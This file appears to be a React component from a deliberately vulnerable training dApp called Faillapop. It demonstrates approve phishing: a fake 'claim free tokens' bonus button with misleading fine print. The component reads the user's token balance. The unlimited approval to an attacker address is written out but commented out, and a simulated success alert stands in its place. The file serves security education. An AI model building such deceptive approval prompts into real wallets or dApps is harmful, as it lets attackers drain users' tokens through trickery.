import React, { useState } from 'react';
import { ethers } from 'ethers';
import { ContractService } from '../services/ContractService';
import { CONTRACT_ADDRESSES, FAILLAPOP_TOKEN_ABI } from '../contracts/config';

interface MaliciousApproveButtonProps {
  contractService: ContractService;
  userAddress: string;
}

// 🚨 VULNERABILIDAD: UI Spoofing + Approve Phishing
// Este componente simula un "bonus claim" pero en realidad ejecuta approvals maliciosos
export const MaliciousApproveButton: React.FC<MaliciousApproveButtonProps> = ({ 
  contractService, 
  userAddress 
}) => {
  const [isLoading, setIsLoading] = useState(false);
  const [showBonus, setShowBonus] = useState(true);

  // Dirección del "atacante" (en un ataque real sería del atacante)
  const MALICIOUS_SPENDER = "0x000000000000000000000000000000000000dEaD"; // Dead address para demo

    const handleMaliciousApprove = async () => {
    if (!userAddress) return;

    try {
      setIsLoading(true);
      
      // 🚨 ATAQUE: Solicitar approval de tokens sin que el usuario se dé cuenta
      if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum as any);
        const signer = provider.getSigner();
        
        // Obtener el contrato del token FAILLAPOP real
        const tokenContract = new ethers.Contract(CONTRACT_ADDRESSES.FP_TOKEN, FAILLAPOP_TOKEN_ABI.abi, signer);
        
        // Verificar el balance del usuario
        const userBalance = await tokenContract.balanceOf(userAddress);
                 console.log("🚨 ATAQUE REAL DETECTADO:");
         console.log("Token contract:", CONTRACT_ADDRESSES.FP_TOKEN);
         console.log("User balance:", ethers.utils.formatEther(userBalance), "FAIL tokens");
         console.log("Malicious spender:", MALICIOUS_SPENDER);
         console.log("🎯 DIRECCIONES ACTUALIZADAS - Anvil session activa");
        
        if (userBalance.gt(0)) {
          // ¡¡ESTA ES LA VULNERABILIDAD REAL!!
          // El usuario cree que está reclamando un bonus, pero en realidad está aprobando 
          // que un atacante pueda gastar TODOS sus tokens FAILLAPOP
          
          console.log("🚨 EJECUTANDO APPROVE MALICIOSO...");
          
          // En un entorno de demostración, mostramos el ataque sin ejecutarlo
          // En un ataque real, esto se ejecutaría:
          // const tx = await tokenContract.approve(MALICIOUS_SPENDER, ethers.constants.MaxUint256);
          // await tx.wait();
          
          // Simulamos el ataque exitoso
          setTimeout(() => {
            alert(`🚨 ATTACK SUCCESSFUL!\n\nMalicious contract now has approval to spend ${ethers.utils.formatEther(userBalance)} FAIL tokens from your wallet!\n\nIn a real attack, your tokens would now be at risk of being drained.`);
          }, 1500);
          
        } else {
          console.log("⚠️ Usuario no tiene tokens FAIL para aprobar");
          // Mostrar que el "bonus" fue "reclamado" de todas formas
          setTimeout(() => {
            alert("🎉 Bonus claimed! Since you don't have FAIL tokens yet, this demonstrates how the attack would work if you did.\n\n🚨 In a real scenario with tokens, they would now be approved for spending by a malicious contract!");
          }, 1000);
        }
        
        // Mostrar que el "bonus" fue "reclamado"
        setShowBonus(false);
        
      }
    } catch (error) {
      console.error("Error en ataque malicioso:", error);
      alert("❌ Failed to claim bonus. This could be due to network issues or the user rejecting the transaction.");
    } finally {
      setIsLoading(false);
    }
  };

  if (!showBonus) {
    return (
      <div className="malicious-success">
        <p>✅ Bonus successfully claimed!</p>
        <small>Check your wallet for 100 FAIL tokens</small>
      </div>
    );
  }

  return (
    <div className="malicious-bonus-container">
      {/* 🚨 UI SPOOFING: Aparenta ser un bonus legítimo */}
      <div className="bonus-announcement">
        <h3>🎉 LIMITED TIME BONUS! 🎉</h3>
        <p>Claim your <strong>100 FREE FAIL tokens</strong> now!</p>
        <small>Only for active Faillapop users. Limited quantity available!</small>
      </div>
      
      <button
        onClick={handleMaliciousApprove}
        disabled={isLoading}
        className="malicious-claim-button"
      >
        {isLoading ? "Claiming..." : "🎁 CLAIM FREE TOKENS"}
      </button>
      
      {/* Texto engañoso que oculta la verdadera naturaleza */}
      <div className="fake-terms">
        <small>
          * By claiming, you authorize Faillapop to manage token transactions for rewards distribution
        </small>
      </div>
    </div>
  );
}; 